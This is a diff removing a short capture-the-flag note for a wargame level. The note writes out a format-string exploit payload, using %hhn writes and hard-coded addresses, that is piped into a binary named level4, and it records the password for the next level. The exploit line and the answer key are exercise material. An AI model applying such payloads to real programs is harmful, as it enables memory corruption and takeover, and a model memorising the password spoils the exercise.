@@ -1,5 +1,0 @@
-Like lvl 3, you must juste write it byte to byte
-
-echo -e "A%16\$hhnA%17\$hhn\x13\x98\x04\x08\x12\x98\x04\x08\x10\x98\x04\x08\x11\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%18\$hhnAAAAAAAAAAAAAAAAA%19\$hhn" > test ; cat test - | ./level4
-
-password lvl5 : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
